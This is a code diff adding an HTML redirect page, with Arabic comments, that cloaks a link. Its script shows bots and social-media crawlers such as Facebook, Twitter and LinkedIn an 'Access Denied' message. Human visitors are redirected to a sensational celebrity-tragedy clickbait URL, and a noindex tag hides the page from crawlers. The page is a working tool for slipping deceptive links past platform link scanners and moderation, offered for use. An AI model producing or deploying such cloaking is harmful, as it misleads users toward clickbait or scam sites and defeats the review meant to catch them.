@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <!-- إعداد ملف robots.txt لضمان عدم فهرسة الروبوتات -->
+    <meta name="robots" content="noindex, nofollow">
+</head>
+<body>
+    <script>
+        // التحقق من نوع المستخدم للتأكد أنه ليس روبوتًا
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        // منع الروبوتات من الوصول عن طريق التحقق من وجود "bot" أو "crawl" في User-Agent
+        if (!/bot|crawl|spider|slurp|facebook|Facebot|Twitterbot|Pinterest|LinkedIn/i.test(userAgent)) {
+            // إذا لم يكن روبوتًا، يتم إعادة توجيه الزائر إلى الموقع المستهدف
+            window.location.href = "https://buzzino.xyz/hollywood-reports-very-sad-news-about-angelina-jolie-she-is-confirmed-assee-more/"; // ضع الرابط الذي تريد إعادة التوجيه إليه
+        } else {
+            // عرض رسالة للروبوتات (لن يتم توجيههم)
+            document.body.innerHTML = "<h1>Access Denied</h1>";
+        }
+    </script>
+    <noscript>
+        <!-- إذا كان الزائر لا يستخدم JavaScript -->
+        <p>Please enable JavaScript to view this page correctly.</p>
+    </noscript>
+</body>
+</html>
